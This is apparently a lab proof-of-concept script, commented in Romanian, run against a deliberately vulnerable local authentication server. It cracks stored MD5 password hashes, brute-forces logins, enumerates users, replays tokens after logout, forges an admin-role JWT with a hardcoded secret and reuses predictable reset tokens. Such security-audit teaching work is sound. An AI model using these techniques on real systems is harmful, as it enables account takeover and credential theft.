'''
comenzile folosite pentru a testa v2:

powershell -Command "Measure-Command {curl -s -X POST http://127.0.0.1:8000/auth/login -H 'Content-Type: application/json' -d '{\"email\":\"mihai@qsp.ro\",\"password\":\"e\"}' | Out-Null}"  

powershell -Command "Measure-Command {curl -s -X POST http://127.0.0.1:8000/auth/login -H 'Content-Type: application/json' -d '{\"email\":\"ur9u390u390ru390ur3u0\",\"password\":\"oae\"}' | Out-Null}" 

for /L %i in (1,1,15) do curl.exe -s -o nul -w "%i %{http_code}\n" -X POST http://127.0.0.1:8000/auth/login -H "Content-Type: application/json" -d {\"email\":\"x@y.z\",\"password\":\"x\}" script pentru cmd pentru a executa prea multe cereri (test rate limiting) 

'''


import sqlite3
import time
import hashlib
import os
import requests
from jose import jwt


# in raport, erau implementari teoretice de poc cu curl - aici le implementam concret

BASE = "http://127.0.0.1:8000"
DB = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "data_vulnerabil.db")  # asa gaseste db pe orice sistem
SECRET = "cheiefoartesecreta"  # aceeasi cheie hardcodata din server


# helpere pe csre le folosim mai jos pentru poc 
def register(email, pwd):
    return requests.post(f"{BASE}/auth/register", json={"email": email, "password": pwd})

def login(email, pwd):
    return requests.post(f"{BASE}/auth/login", json={"email": email, "password": pwd})

def auth(tok):
    return {"Authorization": f"Bearer {tok}"}


def parole_slabe():
    print("\nInregistrare cu parole slabe")
    cazuri = [
        ("mihai@qsp.ro",   "ab"),
        ("davidescu@ab",   "bedes"),
        ("antonia@ab.it",  "amiga"),
        ("comp@at.it",     "1"),
    ]
    suffix = str(int(time.time()))  # sa se poata re executa scriptul, de test
    for email, p in cazuri:
        e = email.replace("@", f"_{suffix}@")
        r = register(e, p)
        print(f"  {e:40s} parola={p!r:10s} -> HTTP {r.status_code}")


#  acces la db, se sparge cu rainbow tables
def vizualizare_db():
    print("\ncitim direct din bd")
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    rows = conn.execute("SELECT email, password_hash, role FROM users LIMIT 8").fetchall() # limitam la 8 sa nu avem output de 50 de randuri
    conn.close()

    for r in rows:
        print(f"  {r['email']:40s} {r['password_hash']}  [{r['role']}]")

    # simulare de rainbow table
    dict_uzual = ["ab", "bedes", "amiga", "1", "localebaneasa", "ituniversita"]
    rainbow = {hashlib.md5(p.encode()).hexdigest(): p for p in dict_uzual}

    print("  cracked:")
    for r in rows:
        h = r["password_hash"]
        if h in rainbow:
            print(f"    {r['email']} -> {rainbow[h]}")


# serverul nu are deloc rate limiting, bruteforce simplu
def brute_force():
    print("\nbrute force fara rate limit sau lockout")
    email = f"antonia_{int(time.time())}@ab.it"
    register(email, "amiga")

    candidates = ["bedes", "1", "ab", "ituniversita", "amiga"]
    t0 = time.time()
    for i, p in enumerate(candidates, start=1):
        r = login(email, p)
        print(f"  try {p!r:16s} -> HTTP {r.status_code}")
        if r.status_code == 200:
            print(f"  GASIT in {time.time() - t0:.2f}s dupa {i} incercari")
            break


# enumerare utilizatori - mesaje diferite pentru email vs parola gresita
def enumerare_useri():
    print("\nEnumerare useri din mesajele de eroare")
    davidescu = f"davidescu_{int(time.time())}@ab"
    register(davidescu, "bedes")

    # primul email exista, celelalte doua nu deci ar trebui sa primim raspunsuri diferite
    pentru_test = [davidescu, "amicu@ab", "comp@at.it"]
    for e in pentru_test:
        r = login(e, "bedes")
        detail = r.json().get("detail")
        print(f"  {e:40s} -> {r.status_code}  {detail!r}")


# jwt fara expirare, merge refolosit la infinit
def replay_session():
    print("\nesiune reutilizabila (JWT fara exp)")
    email = f"antonia_{int(time.time())}@ab.com"
    register(email, "amiga")

    tok = login(email, "amiga").json()["access_token"]
    claims = jwt.decode(tok, SECRET, algorithms=["HS256"], options={"verify_exp": False})
    print(f"  claims: {claims}")
    print(f"  exp prezent? {'exp' in claims}")

    # logout pe partea de server, dar tokenul ramane valid pentru ca nu exista blacklist
    requests.post(f"{BASE}/auth/logout", headers=auth(tok))
    r = requests.get(f"{BASE}/tickets", headers=auth(tok))
    print(f"  GET /tickets dupa logout -> HTTP {r.status_code} (token inca valid)")

    # facem token cu rol MANAGER, semnat cu cheia hardcodata
    payload = {"sub": "1", "email": "atacator@atacator.tld", "role": "MANAGER"}
    forged = jwt.encode(payload, SECRET, algorithm="HS256")
    r = requests.get(f"{BASE}/tickets", headers=auth(forged))
    print(f"  token creat MANAGER -> HTTP {r.status_code}")


# token previzibil pe baza de timestamp, intors direct in raspuns
def reset_parola():
    print("\nReset parolat")
    email = f"antonia_{int(time.time())}@ab.com"
    register(email, "amiga")

    r = requests.post(f"{BASE}/auth/forgot-password", json={"email": email})
    print(f"  forgot-password -> {r.json()}")
    token = r.json()["message"].split(": ")[1]
    print(f"  token = {token} (se poate ghici)")

    # email inexistent 
    r2 = requests.post(f"{BASE}/auth/forgot-password", json={"email": "amicu@ab"})
    print(f"  forgot-password (email inexistent) -> HTTP {r2.status_code}")

    # tokenul nu e marcat folosit => il refolosim de doua ori
    for parola_noua in ["localebaneasa", "ituniversita"]:
        r = requests.post(
            f"{BASE}/auth/reset-password",
            json={"reset_token": token, "new_password": parola_noua},
        )
        print(f"  reset cu parola={parola_noua!r} -> HTTP {r.status_code}")
        ok = login(email, parola_noua).status_code
        print(f"    login dupa reset -> HTTP {ok}")



parole_slabe()
vizualizare_db()
brute_force()
enumerare_useri()
replay_session()
reset_parola()
